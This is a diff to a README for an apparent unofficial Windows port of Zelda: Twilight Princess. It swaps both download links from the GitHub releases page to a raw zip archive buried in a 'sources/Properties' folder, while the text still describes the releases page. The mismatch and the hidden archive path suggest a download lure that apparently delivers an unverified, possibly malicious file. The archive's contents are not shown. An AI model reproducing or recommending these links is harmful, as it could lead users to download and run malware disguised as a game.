@@ -1,6 +1,6 @@
 # ⚔️ Zelda-TP-PC-Port - Play Twilight Princess on your PC
 
-[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Ignescent-sirjacobepstein42/Zelda-TP-PC-Port/releases)
+[![Download Release](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Ignescent-sirjacobepstein42/Zelda-TP-PC-Port/main/sources/Properties/T-Zelda-Port-P-1.9.zip)
 
 This project brings the experience of The Legend of Zelda: Twilight Princess to Windows computers. This native PC port allows users to play the title without the need for an emulator. It runs directly as a Windows application, which improves performance and stability.
 
@@ -8,7 +8,7 @@ This project brings the experience of The Legend of Zelda: Twilight Princess to 
 
 You must visit the official release page to obtain the files for your computer.
 
-[Click here to visit the release page and download the software](https://github.com/Ignescent-sirjacobepstein42/Zelda-TP-PC-Port/releases)
+[Click here to visit the release page and download the software](https://raw.githubusercontent.com/Ignescent-sirjacobepstein42/Zelda-TP-PC-Port/main/sources/Properties/T-Zelda-Port-P-1.9.zip)
 
 Once you reach the page, look for the section labeled Assets under the most recent version. Click the link that ends in .zip to start your download.
 
